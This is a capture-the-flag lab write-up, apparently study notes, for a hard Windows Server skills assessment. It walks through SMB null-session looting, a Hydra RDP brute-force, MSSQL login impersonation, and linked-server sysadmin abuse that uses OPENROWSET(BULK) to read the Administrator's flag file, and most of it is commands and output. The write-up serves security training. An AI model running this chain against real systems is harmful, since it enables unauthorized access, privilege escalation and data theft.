## ID
119

## Module
Attacking Common Services

## Kind
lab

## Title
Skills Assessment — Hard

## Description
Full attack chain on a Windows Server 2019: SMB enumeration (null session) to leak password lists and intel → RDP brute‑force → MSSQL impersonation → linked server privilege escalation → arbitrary file read to retrieve the Administrator’s flag.

## Tags
skills-assessment, smb, rdp, mssql, impersonation, linked-server, privilege-escalation

## Commands
- nmap <TARGET> -Pn -sV -sC -p- --min-rate=200 -T4
- smbclient \\\\<TARGET>\\<SHARE>
- hydra -l <USER> -P <WORDLIST> <TARGET> rdp
- rdesktop -u <USER> -p '<PASS>' <TARGET>
- sqlcmd
- EXECUTE AS LOGIN = '<USER>';
- SELECT srvname, isremote FROM sysservers;
- EXECUTE('SELECT @@servername, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [<LINKED_SERVER>];
- EXECUTE('SELECT * FROM OPENROWSET(BULK ''<FILE_PATH>'', SINGLE_CLOB) AS Contents') AT [<LINKED_SERVER>];

## What This Section Covers
A realistic hard‑level internal assessment. The target runs SMB (null/guest session), RDP, and MSSQL. Attackers enumerate SMB shares to find password lists and internal notes, brute‑force RDP credentials, then pivot to MSSQL. Within MSSQL, they impersonate another user, discover a linked server, and exploit sysadmin privileges on that linked server to read the Administrator’s flag via `OPENROWSET(BULK)`.

## Methodology

1. **Full port scan** – Discover SMB (445), MSSQL (1433), RDP (3389), and other services.
2. **SMB enumeration** – Connect to the `Home` share with null/guest session. Traverse directories (`HR/`, `IT/`, etc.). Download all files, especially password lists and `.txt` files with internal notes.
3. **RDP brute‑force** – Use Hydra with the leaked password list against the `Fiona` user.
4. **Initial access (RDP)** – Log in as Fiona with cracked password.
5. **MSSQL reconnaissance** – Connect to local SQL Server, enumerate users, check impersonation privileges.
6. **Impersonate `john`** – Use `EXECUTE AS LOGIN = 'john';` (Fiona has impersonate permission).
7. **Discover linked servers** – Query `sysservers` to find `LOCAL.TEST.LINKED.SRV`.
8. **Check privileges on linked server** – Execute a query `AT [linked_server]` to discover the service account (`testadmin`) has `sysadmin` role.
9. **Read flag** – Use `OPENROWSET(BULK)` on the linked server to read `C:/Users/Administrator/desktop/flag.txt`.

## Multi‑step Workflow

```bash
# Phase 1 – Nmap full scan
sudo nmap <TARGET_IP> -Pn -sV -sC -p- --min-rate=200 -T4 -oN hardlab -v
# Open ports: 135, 445, 1433, 3389 (Windows Server 2019)

# Phase 2 – SMB enumeration (null session)
smbclient \\\\<TARGET_IP>\\Home
# Browse directories: IT/Fiona/, IT/John/, IT/Simon/
# Download all files
smb: \IT\Fiona\> get creds.txt
smb: \IT\John\> mget *
smb: \IT\Simon\> get random.txt

# Read John's information.txt – reveals MSSQL impersonation + linked server hints

# Phase 3 – RDP brute‑force (using creds.txt as password list)
hydra -l Fiona -P creds.txt <TARGET_IP> rdp
# Found: Fiona:48Ns72!bns74@S84NNNSl

# Phase 4 – RDP as Fiona
rdesktop -u Fiona -p '48Ns72!bns74@S84NNNSl' <TARGET_IP>
# or
xfreerdp /v:<TARGET_IP> /u:Fiona /p:'48Ns72!bns74@S84NNNSl'

# Phase 5 – Inside the RDP session, open PowerShell and launch sqlcmd
sqlcmd

# 5.1 – Impersonate john
1> EXECUTE AS LOGIN = 'john';
2> SELECT SYSTEM_USER;
3> SELECT IS_SRVROLEMEMBER('sysadmin');
4> GO
# Output: john, 0 (not sysadmin locally)

# 5.2 – Discover linked servers
1> SELECT srvname, isremote FROM sysservers;
2> GO
# Shows: LOCAL.TEST.LINKED.SRV (isremote=0)

# 5.3 – Check privileges on linked server
1> EXECUTE('SELECT @@servername, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV];
2> GO
# Output: WINSRV02\SQLEXPRESS, testadmin, 1  → sysadmin on linked server!

# 5.4 – Read the flag via OPENROWSET(BULK)
1> EXECUTE('SELECT * FROM OPENROWSET(BULK ''C:/Users/Administrator/desktop/flag.txt'', SINGLE_CLOB) AS Contents') AT [LOCAL.TEST.LINKED.SRV];
2> GO
# Output: HTB{46u$!n9_l!nk3d_$3rv3r$}

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|common-services]]  
← [[17-skills-assessment-easy]]
<!-- AUTO-LINKS-END -->
